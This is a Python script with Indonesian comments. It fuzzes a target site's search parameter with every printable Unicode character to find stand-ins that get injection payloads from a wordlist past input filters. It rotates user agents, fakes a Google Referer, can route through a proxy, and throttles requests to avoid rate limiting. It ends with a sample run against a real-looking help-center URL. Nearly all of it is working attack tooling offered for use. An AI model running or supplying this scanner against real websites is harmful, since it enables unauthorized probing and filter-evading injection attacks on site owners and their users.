import requests
import random
import urllib.parse
import time

# Random User-Agent List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/537.36"
]

# Generate simbol alternatif dari Unicode
def generate_symbol_variants():
    return [chr(i) for i in range(0x0020, 0x10FFFF) if chr(i).isprintable()]

# Fungsi untuk membaca payload dari wordlist.txt
def load_payloads(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

# Fungsi untuk menguji dan mengganti karakter dalam payload
def find_bypass_symbols(url, wordlist_file, use_proxy=False, use_random_agent=False):
    payloads = load_payloads(wordlist_file)
    symbols = generate_symbol_variants()
    
    session = requests.Session()
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} if use_proxy else {}

    for payload in payloads:
        bypass_map = {}  # Menyimpan simbol pengganti karakter
        valid_payload = ""  # Menyimpan payload yang berhasil bypass

        for char in payload:
            for symbol in symbols:
                test_payload = valid_payload + symbol  # Membangun payload bertahap
                payload_encoded = urllib.parse.quote(test_payload)
                test_url = url.format(payloadrandom=payload_encoded)

                headers = {
                    "User-Agent": random.choice(USER_AGENTS) if use_random_agent else USER_AGENTS[0],
                    "Referer": "https://www.google.com/",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive"
                }

                try:
                    response = session.get(test_url, headers=headers, proxies=proxies, timeout=15)
                    status_code = response.status_code
                    response_snippet = response.text[:200]

                    if status_code == 200 and symbol in response.text:
                        bypass_map[char] = symbol
                        valid_payload += symbol
                        print(f"[✅] Karakter '{char}' berhasil diganti dengan '{symbol}'")
                        break  # Berhenti mencari pengganti untuk karakter ini
                except requests.exceptions.ReadTimeout:
                    print(f"[⚠️] Timeout saat mengakses {test_url}, mencoba lagi dengan delay lebih lama...")
                    time.sleep(5)
                except requests.exceptions.RequestException as e:
                    print(f"[⚠️] Error saat mengakses {test_url}: {e}")

            # Delay untuk menghindari rate-limiting
            time.sleep(2)

        print("\n🔥 Hasil Bypass:")
        print(f"   - Payload Asli: {payload}")
        print(f"   - Payload Bypass: {valid_payload}")
        print(f"   - Map Karakter: {bypass_map}\n")

# 🔥 Contoh penggunaan
find_bypass_symbols("https://www.target.id/help-center/search?search={payloadrandom}", "wordlist.txt", use_proxy=False, use_random_agent=True)
